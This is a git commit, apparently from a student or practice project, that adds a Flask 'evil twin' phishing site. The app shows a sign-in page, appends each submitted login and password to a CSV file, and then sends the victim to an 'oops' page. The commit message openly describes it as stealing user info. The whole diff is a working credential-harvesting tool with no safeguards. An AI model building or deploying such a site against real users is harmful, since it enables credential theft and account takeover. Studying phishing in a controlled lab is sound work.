41275451a97ae51ce5230c30e34cf707df5abfe5
SokoSasha <asokolova19@gmail.com>
2024-10-05 23:21:55 +0300

    Evil twin website to "steal" user's info

---
+++ evil_twin/app.py
@@ -0,0 +1,33 @@
+import csv
+
+from flask import Flask, render_template, redirect, url_for, request
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return redirect(url_for('signin'))
+
+
+@app.route('/signin', methods=['GET', 'POST'])
+def signin():
+    if request.method == 'POST':
+        if 'login' in request.form and 'password' in request.form:
+            login = request.form['login']
+            password = request.form['password']
+
+            with open('info.csv', mode='a', newline='') as file:
+                writer = csv.writer(file)
+                writer.writerow([login, password])
+
+            return redirect(url_for('oops'))
+
+    return render_template('signin.html')
+
+@app.route('/oops', methods=['GET'])
+def oops():
+    return render_template('oops.html')
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
